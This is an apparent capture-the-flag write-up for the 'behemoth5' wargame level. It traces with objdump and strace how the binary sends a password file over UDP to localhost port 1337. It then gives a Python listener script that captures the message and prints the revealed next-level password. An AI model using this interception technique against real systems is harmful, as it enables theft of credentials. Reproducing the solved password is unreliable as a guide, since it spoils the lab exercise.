upon opening the program we get nothing, so we use objdump to see what's what:
we see the popen@plt socket@plt and the sendto@plt -->
 we realize that the server is sending the contents of 
/etc/behemoth_pass/behemoth6 to somewhere
we see in the documentation that sendto recieves the msg, etc... and address, port
so we want to use strace to see the params, but strace is our service so we 
cant open the file - so we download the file using sftp and use:
strace behemoth5
we see we must create the directory /etc/behemoth_pass/behemoth6!
strace behemoth5
we see that the socket sends using SOCK_DGRAM (udp) to 127.0.0.1 at port 1337

and so we write a python script:
```python
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

with open("a.txt", 'wb') as f:
	s.bind(("127.0.0.1", 1337))
	f.write("bound\n")
	msg, addr = s.recvfrom(1024)
	f.write(msg)
	f.close()
```
now we just execute in parallel using: python exploit.py &
we hit /behemoth/behemoth5

and we get:
bound
mayiroeche 
